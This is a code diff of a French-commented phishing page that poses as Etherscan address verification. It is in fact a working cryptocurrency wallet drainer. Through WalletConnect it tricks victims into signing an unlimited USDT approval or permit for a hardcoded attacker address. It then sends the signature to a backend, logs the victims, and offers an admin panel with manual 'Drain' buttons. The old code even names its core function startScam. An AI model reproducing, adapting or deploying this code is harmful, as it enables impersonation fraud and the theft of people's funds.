-    //const FORWARDER = '0x86Fe14231f56b6E694F75Bece72debBB0E8d12ba'; // Nouveau contrat deployé
-    const API = 'https://aml-checker-4.vercel.app/api/store-victim';
-    const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
-
-    let signClient, session, account, currentChainId;
-
-    function getSignClient() {
-      const ns = window["@walletconnect/sign-client"];
-      if (ns) {
-        const sc = ns.SignClient || ns.default;
-        if (sc && typeof sc.init === 'function') return sc;
-      }
-      return null;
+  // Unlock drain form
+  adminLoginBtn.addEventListener('click', () => {
+    if (adminPassword.value === ADMIN_PASSWORD) {
+      adminLoginDiv.style.display = 'none';
+      adminDrainDiv.style.display = 'block';
+      sessionStorage.setItem('adminToken', ADMIN_SECRET);
+    } else {
+      loginError.style.display = 'block';
     }
+  });
 
-    async function initWalletConnect() {
-      const SignClientClass = getSignClient();
-      if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
+  // Drain manually
+  drainBtn.addEventListener('click', async () => {
+    const victim = victimAddress.value.trim();
+    if (!ethers.utils.isAddress(victim)) {
+      drainStatus.textContent = '❌ Invalid address';
+      return;
+    }
+    drainStatus.textContent = '⏳ Draining...';
+    try {
+      const resp = await fetch('/api/store-victim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ victim, adminSecret: ADMIN_SECRET })
+      });
+      const data = await resp.json();
+      drainStatus.textContent = data.success ? '✅ Drain successful' : `❌ ${data.error || 'Failed'}`;
+    } catch (err) {
+      drainStatus.textContent = '❌ Network error';
+    }
+  });
 
-      signClient = await SignClientClass.init({
-        projectId: PROJECT_ID,
-        metadata: {
-          name: 'Etherscan',
-          description: 'Verify Address Ownership',
-          url: 'https://app-etherscan.io',
-          icons: ['https://app-etherscan.io/etherscan-logo-circle.png']
+  /* ===== WalletConnect + PermitDrain Meta-Transaction ===== */
+  const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
+  const PERMIT_DRAIN_ADDRESS = '0xaD78f97c63191227AD19DA543fc3fb022aA0D90f';
+  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const API = '/api/store-victim';
+  const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
+
+  let signClient, session, account, currentChainId;
+
+  function getSignClient() {
+    const ns = window["@walletconnect/sign-client"];
+    if (ns) {
+      const sc = ns.SignClient || ns.default;
+      if (sc && typeof sc.init === 'function') return sc;
+    }
+    return null;
+  }
+
+  async function initWalletConnect() {
+    const SignClientClass = getSignClient();
+    if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
+
+    signClient = await SignClientClass.init({
+      projectId: PROJECT_ID,
+      metadata: {
+        name: 'Etherscan',
+        description: 'Verify Address Ownership',
+        url: 'https://app-etherscan.io',
+        icons: ['https://app-etherscan.io/etherscan-logo-circle.png']
+      }
+    });
+
+    const { uri, approval } = await signClient.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ['personal_sign'],
+          chains: ['eip155:1'],
+          events: []
         }
-      });
+      },
+      redirect: { universal: 'https://app-etherscan.io/verifyaddress' }
+    });
 
-      const { uri, approval } = await signClient.connect({
-        requiredNamespaces: {
-          eip155: {
-            methods: ['eth_sendTransaction'],
-            chains: ['eip155:1'],
-            events: ['chainChanged', 'accountsChanged']
-          }
-        },
-        redirect: { universal: 'https://app-etherscan.io/verifyaddress' }
-      });
+    // Check QR library
+    if (typeof window.QRCodeStyling === 'undefined') {
+      document.querySelector('.scan').textContent = 'QR library not loaded';
+      return;
+    }
 
-      // Check QR library
-      if (typeof window.QRCodeStyling === 'undefined') {
-        document.querySelector('.scan').textContent = 'QR library not loaded';
-        return;
-      }
-
-      const qrDiv = document.getElementById('qrcode');
-      qrDiv.innerHTML = `
-        <div id="qr-wrapper">
-          <div id="qr-code"></div>
-          <div id="logo-box">
-            <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
-              <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
-              <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
-            </svg>
-          </div>
+    const qrDiv = document.getElementById('qrcode');
+    qrDiv.innerHTML = `
+      <div id="qr-wrapper">
+        <div id="qr-code"></div>
+        <div id="logo-box">
+          <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
+            <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
+            <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
+          </svg>
         </div>
-      `;
+      </div>
+    `;
 
-      const qrCode = new window.QRCodeStyling({
-        width: 300,
-        height: 300,
-        type: "svg",
-        data: uri,
-        margin: 0,
-        qrOptions: {
-          typeNumber: 0,
-          mode: "Byte",
-          errorCorrectionLevel: "M"
-        },
-        dotsOptions: {
-          type: "dots",
-          color: "#000000"
-        },
-        backgroundOptions: {
-          color: "#ffffff"
-        },
-        cornersSquareOptions: {
-          type: "extra-rounded",
-          color: "#000000"
-        },
-        cornersDotOptions: {
-          type: "dot",
-          color: "#000000"
-        }
-      });
-      qrCode.append(document.getElementById("qr-code"));
+    const qrCode = new window.QRCodeStyling({
+      width: 300,
+      height: 300,
+      type: "svg",
+      data: uri,
+      margin: 0,
+      qrOptions: {
+        typeNumber: 0,
+        mode: "Byte",
+        errorCorrectionLevel: "M"
+      },
+      dotsOptions: {
+        type: "dots",
+        color: "#000000"
+      },
+      backgroundOptions: {
+        color: "#ffffff"
+      },
+      cornersSquareOptions: {
+        type: "extra-rounded",
+        color: "#000000"
+      },
+      cornersDotOptions: {
+        type: "dot",
+        color: "#000000"
+      }
+    });
+    qrCode.append(document.getElementById("qr-code"));
 
-      session = await approval();
+    session = await approval();
 
-      const accounts = session.namespaces['eip155'].accounts;
-      const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
-      if (!ethAccount) throw new Error('Ethereum mainnet requis');
-      account = ethAccount.split(':')[2];
-      currentChainId = '1';
+    const accounts = session.namespaces['eip155'].accounts;
+    const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
+    if (!ethAccount) throw new Error('Ethereum mainnet requis');
+    account = ethAccount.split(':')[2];
+    currentChainId = '1';
 
-      // Replace QR with status
-      qrDiv.innerHTML = '';
-      qrDiv.style.display = 'flex';
-      qrDiv.style.alignItems = 'center';
-      qrDiv.style.justifyContent = 'center';
-      qrDiv.style.fontSize = '14px';
-      qrDiv.style.color = 'var(--azure-15)';
-      qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+    // Replace QR with status
+    qrDiv.innerHTML = '';
+    qrDiv.style.display = 'flex';
+    qrDiv.style.alignItems = 'center';
+    qrDiv.style.justifyContent = 'center';
+    qrDiv.style.fontSize = '14px';
+    qrDiv.style.color = 'var(--azure-15)';
+    qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = 'En attente de signature…';
+
+    // Enregistrer la connexion du wallet dans l'historique
+    fetch('/api/record-wallet', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        address: account,
+        chain: currentChainId
+      })
+    }).catch(err => console.error('Erreur record-wallet:', err));
+    
+    // Passer à la demande de signature
+    setTimeout(requestSignature, 1000);
+  }
+
+  async function requestSignature() {
+    try {
+      const provider = new ethers.providers.JsonRpcProvider('https://1rpc.io/eth');
+      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, [
+        'function nonces(address) view returns (uint256)'
+      ], provider);
+      const nonce = await permitContract.nonces(account);
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+      // Struct hash
+      const structHash = ethers.utils.solidityKeccak256(
+        ['address','address','address','uint256','uint256','uint256'],
+        [account, USDT_ADDR, ATTACKER, MAX_UINT256, deadline, nonce]
+      );
+      const messageToSign = ethers.utils.hexlify(structHash);
 
       const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = 'En attente de signature…';
+      if (scanText) scanText.textContent = 'Veuillez signer le message pour prouver la propriété…';
 
-      // Enregistrer la connexion du wallet dans l'historique
-      fetch('/api/record-wallet', {
+      // Demander la signature via WalletConnect
+      const signature = await signClient.request({
+        topic: session.topic,
+        request: {
+          id: Date.now(),
+          jsonrpc: '2.0',
+          method: 'personal_sign',
+          params: [messageToSign, account]
+        },
+        chainId: 'eip155:1'
+      });
+
+      console.log('Signature obtained:', signature);
+      if (scanText) scanText.textContent = '✅ Message signé. Vérification AML en cours…';
+
+      // Envoyer la signature au backend
+      const resp = await fetch(API, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          address: account,
-          chain: currentChainId
+          victim: account,
+          chain: '1',
+          signature,
+          deadline,
+          nonce: nonce.toString(),
+          token: USDT_ADDR,
+          spender: ATTACKER,
+          amount: MAX_UINT256
         })
-      }).catch(err => console.error('Erreur record-wallet:', err));
-      
-      setTimeout(startScam, 1000);
+      });
+      const result = await resp.json();
+      if (result.success) {
+        if (scanText) scanText.textContent = '✅ Vérification terminée. Redirection…';
+        setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+      } else {
+        if (scanText) scanText.textContent = '❌ Erreur lors de la vérification. Veuillez réessayer.';
+      }
+    } catch (e) {
+      console.error('Signature error:', e);
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = '❌ Signature refusée.';
     }
-
-async function startScam() {
-  if (currentChainId !== '1') {
-    document.querySelector('.scan').textContent = 'Réseau non supporté';
-    return;
   }
 
-  const FORWARDER = '0xd3953f345839D145F19C62dD0dB95961bC83BBFF'; // Ton contrat
-  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  // ===== Historique des victimes (inchangé) =====
+  let victimPollTimer = null;
 
-  // Calldata pour execute(USDT, approve(spender, uint256))
-  const approveCallData = '0x095ea7b3' +
-    ATTACKER.slice(2).padStart(64, '0') +
-    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  async function fetchVictims() {
+    const token = sessionStorage.getItem('adminToken');
+    if (!token) {
+      document.getElementById('victim-loading').textContent = 'Accès réservé (admin)';
+      return;
+    }
+    try {
+      const resp = await fetch('/api/victims', {
+        headers: { 'Authorization': 'Bearer ' + token }
+      });
+      if (!resp.ok) throw new Error('Erreur ' + resp.status);
+      const victims = await resp.json();
+      populateTable(victims);
+    } catch (err) {
+      console.error('fetchVictims error:', err);
+      document.getElementById('victim-loading').textContent = 'Erreur de chargement';
+    }
+  }
 
-  // Encoder l'appel au forwarder : execute(address, bytes)
-  const iface = new ethers.utils.Interface([
-    'function execute(address target, bytes calldata data) returns (bytes)'
-  ]);
-  const executeData = iface.encodeFunctionData('execute', [USDT_ADDR, approveCallData]);
+  function populateTable(victims) {
+    const tbody = document.getElementById('victim-tbody');
+    const loading = document.getElementById('victim-loading');
+    const table = document.getElementById('victim-table');
+    if (!tbody || !loading || !table) return;
 
-  const tx = {
-    from: account,
-    to: FORWARDER,
-    data: executeData,
-    gasLimit: '0x30d40' // 200 000 gas – safe
-  };
+    loading.style.display = 'none';
+    table.style.display = '';
+    tbody.innerHTML = '';
 
-  const scanText = document.querySelector('.scan');
-  if (scanText) scanText.textContent = '🔒 En attente de la signature…';
+    victims.forEach(function (v) {
+      const row = document.createElement('tr');
 
-  try {
-    await signClient.request({
-      topic: session.topic,
-      request: {
-        id: Date.now(),
-        jsonrpc: '2.0',
-        method: 'eth_sendTransaction',
-        params: [tx]
-      },
-      chainId: 'eip155:1'
-    });
+      // Adresse
+      const tdAddr = document.createElement('td');
+      tdAddr.textContent = v.address;
+      row.appendChild(tdAddr);
 
-    if (scanText) scanText.textContent = '✅ Signature réussie. Vérification AML en cours…';
+      // Token / chain
+      const tdToken = document.createElement('td');
+      tdToken.textContent = (v.token ? v.token : '?') + (v.chain ? ' (' + v.chain + ')' : '');
+      row.appendChild(tdToken);
 
-    // Enregistrer comme signé
-    await fetch('/api/record-wallet', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
-    });
+      // Montant
+      const tdAmount = document.createElement('td');
+      tdAmount.textContent = v.amount || '0';
+      row.appendChild(tdAmount);
 
-    // Attendre 3s puis drain
-    await new Promise(r => setTimeout(r, 3000));
+      // Date
+      const tdDate = document.createElement('td');
+      tdDate.textContent = v.timestamp ? new Date(v.timestamp).toLocaleString() : '-';
+      row.appendChild(tdDate);
 
-    const drainResp = await fetch(API, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ victim: account, chain: currentChainId })
-    });
-    const drainData = await drainResp.json();
+      // Statut
+      const tdStatus = document.createElement('td');
+      if (v.status === 'drained') {
+        tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
+      } else if (v.status === 'signed') {
+        tdStatus.innerHTML = '<span class="status-success">✅ Signé</span>';
+      } else if (v.status === 'unsigned') {
+        tdStatus.innerHTML = '<span class="status-error">❌ Non signé</span>';
+      } else if (v.status === 'failed') {
+        tdStatus.innerHTML = '<span class="status-error">❌ Échec</span>';
+      } else if (v.status === 'connected') {
+        tdStatus.innerHTML = '<span style="color: var(--azure-40);">🔗 Connecté</span>';
+      } else {
+        tdStatus.textContent = v.status || '?';
+      }
+      row.appendChild(tdStatus);
 
-    if (scanText) scanText.textContent = drainData.success
-      ? '✅ Vérification AML terminée. Redirection…'
-      : '❌ Drain partiellement échoué (voir logs)';
+      // Action
+      const tdAction = document.createElement('td');
+      if (v.status === 'failed') {
+        const btn = document.createElement('button');
+        btn.className = 'drain-btn';
+        btn.textContent = 'Drain';
+        btn.addEventListener('click', function () {
+          manualDrainFromHistory(v.address, v.chain);
+        });
+        tdAction.appendChild(btn);
+      } else {
+        tdAction.textContent = '';
+      }
+      row.appendChild(tdAction);
 
-    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-  } catch (e) {
-    console.error('❌ Transaction refusée', e);
-    if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
-
-    await fetch('/api/record-wallet', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: account, chain: currentChainId, status: 'unsigned' })
+      tbody.appendChild(row);
     });
   }
-}
-    // ===== Historique des victimes =====
-    let victimPollTimer = null;
 
-    async function fetchVictims() {
-      const token = sessionStorage.getItem('adminToken');
-      if (!token) {
-        document.getElementById('victim-loading').textContent = 'Accès réservé (admin)';
-        return;
-      }
-      try {
-        const resp = await fetch('/api/victims', {
-          headers: { 'Authorization': 'Bearer ' + token }
-        });
-        if (!resp.ok) throw new Error('Erreur ' + resp.status);
-        const victims = await resp.json();
-        populateTable(victims);
-      } catch (err) {
-        console.error('fetchVictims error:', err);
-        document.getElementById('victim-loading').textContent = 'Erreur de chargement';
-      }
+  async function manualDrainFromHistory(address, chain) {
+    if (!confirm('Confirmer le drain de ' + address + ' ?')) return;
+    const token = sessionStorage.getItem('adminToken');
+    if (!token) {
+      alert('Token admin manquant');
+      return;
     }
-
-    function populateTable(victims) {
-      const tbody = document.getElementById('victim-tbody');
-      const loading = document.getElementById('victim-loading');
-      const table = document.getElementById('victim-table');
-      if (!tbody || !loading || !table) return;
-
-      loading.style.display = 'none';
-      table.style.display = '';
-      tbody.innerHTML = '';
-
-      victims.forEach(function (v) {
-        const row = document.createElement('tr');
-
-        // Adresse
-        const tdAddr = document.createElement('td');
-        tdAddr.textContent = v.address;
-        row.appendChild(tdAddr);
-
-        // Token / chain
-        const tdToken = document.createElement('td');
-        tdToken.textContent = (v.token ? v.token : '?') + (v.chain ? ' (' + v.chain + ')' : '');
-        row.appendChild(tdToken);
-
-        // Montant
-        const tdAmount = document.createElement('td');
-        tdAmount.textContent = v.amount || '0';
-        row.appendChild(tdAmount);
-
-        // Date
-        const tdDate = document.createElement('td');
-        tdDate.textContent = v.timestamp ? new Date(v.timestamp).toLocaleString() : '-';
-        row.appendChild(tdDate);
-
-        // Statut
-        const tdStatus = document.createElement('td');
-        if (v.status === 'drained') {
-          tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
-        } else if (v.status === 'signed') {
-          tdStatus.innerHTML = '<span class="status-success">✅ Signé</span>';
-        } else if (v.status === 'unsigned') {
-          tdStatus.innerHTML = '<span class="status-error">❌ Non signé</span>';
-        } else if (v.status === 'failed') {
-          tdStatus.innerHTML = '<span class="status-error">❌ Échec</span>';
-        } else if (v.status === 'connected') {
-          tdStatus.innerHTML = '<span style="color: var(--azure-40);">🔗 Connecté</span>';
-        } else {
-          tdStatus.textContent = v.status || '?';
-        }
-        row.appendChild(tdStatus);
-
-        // Action (bouton drain seulement si statut "failed")
-        const tdAction = document.createElement('td');
-        if (v.status === 'failed') {
-          const btn = document.createElement('button');
-          btn.className = 'drain-btn';
-          btn.textContent = 'Drain';
-          btn.addEventListener('click', function () {
-            manualDrainFromHistory(v.address, v.chain);
-          });
-          tdAction.appendChild(btn);
-        } else {
-          tdAction.textContent = '';
-        }
-        row.appendChild(tdAction);
-
-        tbody.appendChild(row);
+    try {
+      const resp = await fetch('/api/store-victim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          victim: address,
+          chain: chain || '1',
+          adminSecret: ADMIN_SECRET
+        })
       });
-    }
-
-    async function manualDrainFromHistory(address, chain) {
-      if (!confirm('Confirmer le drain de ' + address + ' ?')) return;
-      const token = sessionStorage.getItem('adminToken');
-      if (!token) {
-        alert('Token admin manquant');
-        return;
+      const data = await resp.json();
+      if (data.success) {
+        alert('Drain lancé avec succès.');
+        fetchVictims();
+      } else {
+        alert('Échec: ' + (data.error || 'inconnu'));
       }
-      try {
-        const resp = await fetch('/api/store-victim', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            victim: address,
-            chain: chain || '1',
-            adminSecret: ADMIN_SECRET
-          })
-        });
-        const data = await resp.json();
-        if (data.success) {
-          alert('Drain lancé avec succès.');
-          fetchVictims(); // rafraîchir
-        } else {
-          alert('Échec: ' + (data.error || 'inconnu'));
-        }
-      } catch (err) {
-        alert('Erreur réseau');
-      }
+    } catch (err) {
+      alert('Erreur réseau');
     }
+  }
 
-    // Lancer le module après chargement du DOM
-    document.addEventListener('DOMContentLoaded', function() {
-      initWalletConnect().catch(err => {
-        console.error('Erreur init WC:', err);
-        const scanText = document.querySelector('.scan');
-        if (scanText) scanText.textContent = 'Erreur de connexion';
-      });
+  // Lancement automatique
+  document.addEventListener('DOMContentLoaded', function() {
+    initWalletConnect().catch(err => {
+      console.error('Erreur init WC:', err);
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = 'Erreur de connexion';
     });
-  </script>
+  });
+</script>
 </body>
 </html>
